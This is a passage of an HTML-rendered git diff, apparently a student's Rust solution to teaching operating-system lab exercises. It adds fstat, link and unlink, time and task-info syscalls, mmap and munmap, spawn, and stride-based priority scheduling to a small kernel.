super::&#123;File, Stat&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::UserBuffer;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sbi::console_getchar;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::suspend_current_and_run_next;</span></span>@@ -39,6 +39,9 @@ impl File for Stdin &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn write(&amp;self, _user_buf: UserBuffer) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        panic!("Cannot write to stdin!");</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        panic!("Not implemented!");</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl File for Stdout &#123;</span></span>@@ -57,4 +60,7 @@ impl File for Stdout &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        user_buf.len()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        panic!("Not implemented!");</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -1,7 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Implementation of [`FrameAllocator`] which</span><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(v);</span><span class="token prefix unchanged"> </span><span class="token line">    println!("frame_allocator_test passed!");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex a5a9ede..58ac256 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -66,6 +66,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// remove a area</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some((idx, area)) = self</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d75c373..a2ac413 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -12,9 +12,10 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use address::VPNRange;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::VPNRange;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, StepByOne, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use frame_allocator::&#123;frame_alloc, frame_dealloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::is_mem_sufficient;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;kernel_token, MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use page_table::PTEFlags;</span></span>diff --git a/os/src/syscall/fs.rs b/os/src/syscall/fs.rsindex 864d6ba..b27deac 100644<span class="token coord">--- a/os/src/syscall/fs.rs</span><span class="token coord">+++ b/os/src/syscall/fs.rs</span><span class="token coord">@@ -1,5 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! File and filesystem-related syscalls</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::fs::&#123;open_file, OpenFlags, Stat&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::fs::&#123;open_file, OpenFlags, Stat, ROOT_INODE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::&#123;translated_byte_buffer, translated_str, UserBuffer&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::&#123;current_task, current_user_token&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -78,26 +80,55 @@ pub fn sys_close(fd: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement fstat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_fstat(_fd: usize, _st: *mut Stat) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_fstat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_fstat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if _fd > inner.fd_table.len() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(file) = &amp;inner.fd_table[_fd] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let file = file.clone();</span><span class="token prefix inserted">+</span><span class="token line">        drop(inner);</span><span class="token prefix inserted">+</span><span class="token line">        let stat: Stat = file.get_stat();</span><span class="token prefix inserted">+</span><span class="token line">        let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">            current_user_token(), _st as *const u8, size_of::&lt;Stat>());</span><span class="token prefix inserted">+</span><span class="token line">        let mut stat_ptr = &amp;stat as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">        for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">            unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                stat_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">                stat_ptr = stat_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">        -1</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement linkat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_linkat(_old_name: *const u8, _new_name: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_linkat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_linkat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _old_name = translated_str(token, _old_name);</span><span class="token prefix inserted">+</span><span class="token line">    let _new_name = translated_str(token, _new_name);</span><span class="token prefix inserted">+</span><span class="token line">    if _old_name == _new_name &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    ROOT_INODE.linkat(&amp;_old_name, &amp;_new_name)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement unlinkat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_unlinkat(_name: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_unlinkat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_unlinkat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _name = translated_str(token, _name);</span><span class="token prefix inserted">+</span><span class="token line">    ROOT_INODE.unlinkat(&amp;_name)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 613d44e..34197ed 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -59,8 +59,10 @@ use process::*;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::fs::Stat;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::task::current_task;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 4]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_OPEN => sys_open(args[1] as *const u8, args[2] as u32),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_CLOSE => sys_close(args[0]),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 316897d..974412a 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,15 +1,17 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">//!</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    fs::&#123;open_file, OpenFlags&#125;,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;translated_byte_buffer, translated_refmut, translated_str&#125;,</span><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;is_mem_sufficient, VirtAddr&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next,</span><span class="token prefix deleted">-</span><span class="token line">        suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: current_task().unwrap().get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: current_task().unwrap().get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(_len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().mmap(start_va, end_va, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().munmap(start_va, end_va)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span></span>@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: fork + exec =/= spawn</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_spawn(_path: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    // spawn a new process based upon _path</span><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _path = translated_str(token, _path);</span><span class="token prefix inserted">+</span><span class="token line">    let data_opt = open_file(&amp;_path, OpenFlags::RDONLY);</span><span class="token prefix inserted">+</span><span class="token line">    if data_opt.is_none() &#123;  // invalid file name</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let new_task = current_task.spawn(data_opt.unwrap().read_all().as_slice());</span><span class="token prefix inserted">+</span><span class="token line">    let new_pid = new_task.getpid();</span><span class="token prefix inserted">+</span><span class="token line">    add_task(new_task);</span><span class="token prefix inserted">+</span><span class="token line">    new_pid as isize</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Set task priority.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_set_priority(_prio: isize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if _prio &lt;= 1 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    current_task.set_prio(_prio);</span><span class="token prefix inserted">+</span><span class="token line">    _prio</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644<span class="token coord">--- a/os/src/task/manager.rs</span><span class="token coord">+++ b/os/src/task/manager.rs</span>@@ -19,11 +19,27 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Add process back to ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock>) &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        task.inc_stride();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.ready_queue.push_back(task);</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Take a process out of the ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn fetch(&amp;mut self) -> Option&lt;Arc&lt;TaskControlBlock>> &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        self.ready_queue.pop_front()</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        // self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        let mut min_stride = isize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        let mut best_idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for (idx, tcb) in 